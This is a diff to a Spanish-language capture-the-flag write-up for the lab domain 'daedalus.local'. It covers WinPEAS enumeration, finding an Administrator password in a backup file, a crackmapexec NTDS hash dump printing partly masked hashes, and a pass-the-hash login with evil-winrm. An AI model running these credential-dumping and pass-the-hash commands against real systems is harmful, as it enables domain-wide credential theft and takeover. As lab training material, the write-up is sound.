@@ -750,3 +750,90 @@ PS C:\Users\svc_backup.DAEDALUS\Documents> type ..\Desktop\flag.txt
 ASCENSION{***********8****}
 PS C:\Users\svc_backup.DAEDALUS\Documents>
 ```
+Se procedió a utilizar el programa WinPEAS.exe para realizar una enumeración exhaustiva de la máquina. El archivo WinPEAS.exe fue cargado y ejecutado exitosamente en el sistema.
+
+```powershell
+PS C:\Users\svc_backup.DAEDALUS\Documents> upload winpeas.exe
+
+Info: Uploading winpeas.exe to C:\Users\svc_backup.DAEDALUS\Documents\winpeas.exe  
+
+Data: 3166888 bytes of 3166888 bytes copied
+
+Info: Upload successful!
+
+PS C:\Users\svc_backup.DAEDALUS\Documents> .\winpeas.exe
+```
+
+Entre la información recopilada por WinPEAS.exe, se identificó la existencia de otra unidad lógica, la unidad E:
+
+```powershell
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Drives Information
+È Remember that you should search more info inside the other drives
+    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 10 GB)(Permissions: Users [AppendData/CreateDirectories])
+    E:\ (Type: Fixed)(Volume label: Backups)(Filesystem: NTFS)(Available space: 4 GB)(Permissions: Users [AppendData/CreateDirectories])
+```
+
+Se procedió a cambiar al directorio de la unidad E: y, tras explorar los directorios, se descubrió un archivo llamado Users.txt que contenía credenciales para el usuario Administrator.
+
+```powershell
+PS C:\Users\svc_backup.DAEDALUS\Documents> E:
+PS E:\> dir
+
+    Directory: E:\
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       10/13/2020   3:54 PM                Annual IT Compliance Report - Export  
+
+PS E:\> cd 'Annual IT Compliance Report - Export'
+PS E:\Annual IT Compliance Report - Export> dir
+
+    Directory: E:\Annual IT Compliance Report - Export
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       10/10/2020   6:04 AM           4852 Builtin.txt
+-a----       10/10/2020   6:04 AM            530 Daedalus.txt
+-a----       10/10/2020   6:05 AM           2541 Users.txt
+
+PS E:\Annual IT Compliance Report - Export> type Users.txt
+Name	Type	Description
+Administrator	User	DSRM Password: kF4d*********
+.........................................................
+PS E:\Annual IT Compliance Report - Export>
+```
+
+La contraseña descubierta para el usuario Administrator en el equipo DC1 es válida para la autenticación local. Sin embargo, al ser DC (Controlador de Dominio), existe la posibilidad de realizar un volcado del ntds (Servicio de directorio de Active Directory) para obtener todos los hashes de contraseñas almacenados en él. Esto proporcionaría acceso a las contraseñas de todos los usuarios del dominio.
+
+Una vez obtenido el hash del usuario Administrator, podemos utilizarlo para autenticarnos en el equipo DC1 mediante Evil-WinRM, lo que nos brindará una sesión de PowerShell.
+
+Además, si se realiza un volcado de los secretos LSA (Autoridad de seguridad local), es posible encontrar la contraseña en texto plano para el usuario Administrator. Esta contraseña también es válida, pero en este caso es a nivel de dominio. Utilizando esta contraseña, también podríamos conectarnos al DC1 utilizando Evil-WinRM.
+
+```bash
+❯ crackmapexec smb dc1.daedalus.local -u Administrator -p 'kF4d*********' --local-auth
+SMB         daedalus.local  445    DC1              [*] Windows 10.0 Build 17763 x64 (name:DC1) (domain:DC1) (signing:True) (SMBv1:False)  
+SMB         daedalus.local  445    DC1              [+] DC1\Administrator:kF4d********* (Pwn3d!)
+
+❯ crackmapexec smb dc1.daedalus.local -u Administrator -p 'kF4d*********' --local-auth --ntds drsuapi
+SMB         daedalus.local  445    DC1              [*] Windows 10.0 Build 17763 x64 (name:DC1) (domain:DC1) (signing:True) (SMBv1:False)
+SMB         daedalus.local  445    DC1              [+] DC1\Administrator:kF4d********* (Pwn3d!)
+SMB         daedalus.local  445    DC1              [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         daedalus.local  445    DC1              Administrator:500:aad3b435b514*****************ff633d308be8e06dbb4e2e88783533:::
+SMB         daedalus.local  445    DC1              Guest:501:aad3b435b51404e*****************d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         daedalus.local  445    DC1              krbtgt:502:aad3b435b5140*****************:3e1e73de1f69e094386b8496fdbdaa90:::
+SMB         daedalus.local  445    DC1              daedalus.local\elliot:1112:aad3b4*****************35b51404ee:74fdf381a94e1e446aaedf1757419dcd:::
+SMB         daedalus.local  445    DC1              daedalus.local\svc_backup:1602:aad3b*****************04ee:f913cd9d773be0d48389d45a20b6364a:::
+SMB         daedalus.local  445    DC1              daedalus.local\billing_user:1603:aad3b435b*****************c86ce4386582442450feed8ce53:::  
+SMB         daedalus.local  445    DC1              DC1$:1000:aad3b435b51404eeaa*****************1e5aa0c0fd1fc33a8fb:::
+SMB         daedalus.local  445    DC1              WEB01$:1109:aad3b435b51404ee*****************ef31ca13817f6d6c73b3c26b1a:::
+SMB         daedalus.local  445    DC1              MEGAAIRLINE$:1108:aad3b435b51*****************1f2b98c63593309aa61ae76d:::
+```
+
+```
+❯ evil-winrm -i dc1.daedalus.local -u Administrator -H a3ff63*****************  
+PS C:\Users\Administrator\Documents> whoami
+daedalus\administrator
+PS C:\Users\Administrator\Documents> type ..\Desktop\flag.txt
+ASCENSION{*****************}
+PS C:\Users\Administrator\Documents>
+```
